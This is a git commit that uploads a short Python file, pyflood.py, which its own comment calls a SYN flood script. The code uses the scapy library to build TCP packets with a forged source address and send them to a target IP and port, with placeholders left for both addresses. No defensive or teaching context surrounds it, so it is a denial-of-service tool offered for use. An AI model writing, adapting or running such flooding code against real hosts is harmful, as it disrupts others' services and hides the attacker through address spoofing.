d8ae1083c01c97dd20b750ffa7d17317790b09f8
Jack Philip Button <38291937+JPButton@users.noreply.github.com>
2020-05-01 05:58:58 -0400

    Add files via upload

---
+++ pyflood.py
@@ -0,0 +1,14 @@
+#synflood script
+
+from scapy.all import *
+
+def flood(source,target):
+    for source_p in range(100,150):
+        IPlayer = IP(src=source,dst=target)
+        TCPlayer = TCP(sport=source_p,dport=600)
+        pkt = IPlayer,TCPlayer
+        send(pkt)
+
+source = "[put IP here]"
+target = "[put Target IP here]"
+flood(source,target)
